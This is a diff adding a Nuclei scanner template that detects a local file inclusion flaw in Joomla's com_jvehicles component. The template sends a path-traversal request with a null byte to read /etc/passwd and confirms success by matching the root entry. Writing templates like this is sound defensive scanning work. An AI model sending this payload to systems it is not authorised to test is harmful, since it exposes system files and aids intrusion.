@@ -1,0 +1,23 @@
+id: joomla-com_jvehicles-lfi
+info:
+  name: Joomla Component com_jvehicles Local File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    A local file inclusion vulnerability exists in Joomla!'s Jvehicles (com_jvehicles) component, allowing remote attackers to load arbitrary files via controller parameters in index.php.
+  reference:
+    - https://www.exploit-db.com/exploits/11997
+http:
+  - raw:
+      - |
+        GET /index.php?option=com_jvehicles&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0"
